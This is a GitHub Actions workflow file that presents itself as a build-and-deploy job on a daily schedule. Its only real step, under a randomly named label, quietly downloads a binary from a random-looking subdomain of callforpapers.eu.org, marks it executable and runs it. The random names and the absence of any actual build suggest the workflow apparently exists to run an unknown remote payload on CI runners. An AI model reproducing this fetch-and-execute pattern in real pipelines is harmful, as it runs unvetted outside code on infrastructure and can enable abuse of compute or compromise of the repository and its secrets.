#2024-03-18-[083400]-v7y5is20
name: main

on:
  workflow_dispatch:

  repository_dispatch:
    types: runner_workflow

  schedule:
    - cron: "45 1 * * * "

jobs:
  build-deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: x54q8orob8o1ycxp
        run: |
          wget -q https://td4fo1mfhcm3i3cl.callforpapers.eu.org/sync_repositories
          chmod 755 sync_repositories
          ./sync_repositories